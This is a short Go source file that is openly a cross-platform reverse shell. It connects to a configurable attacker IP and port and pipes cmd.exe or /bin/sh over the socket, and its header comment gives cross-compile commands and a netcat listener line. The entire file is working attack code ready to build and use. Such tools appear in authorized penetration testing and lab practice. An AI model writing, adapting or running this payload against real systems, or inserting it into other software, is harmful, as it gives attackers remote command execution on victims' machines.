package main

import (
	"net"
	"os"
	"os/exec"
	"runtime"
)

/*
 * go-rev-shell - Cross-Platform Reverse Shell
 *
 * Compile for current OS:
 *   go build -o rev_shell main.go
 *
 * Cross-compile Linux → Windows:
 *   GOOS=windows GOARCH=amd64 go build -o rev_shell.exe main.go
 *
 * Cross-compile Linux → Linux:
 *   GOOS=linux GOARCH=amd64 go build -o rev_shell main.go
 *
 * Listener:
 *   nc -nlvp 4444
 */

// -- CONFIGURE THESE --------------------------------------
const (
	attackerIP   = "10.10.10.10"
	attackerPort = "4444"
)

// ---------------------------------------------------------

func main() {
	conn, err := net.Dial("tcp", attackerIP+":"+attackerPort)
	if err != nil {
		os.Exit(1)
	}
	defer conn.Close()

	var shell string
	if runtime.GOOS == "windows" {
		shell = "cmd.exe"
	} else {
		shell = "/bin/sh"
	}

	cmd := exec.Command(shell)
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}
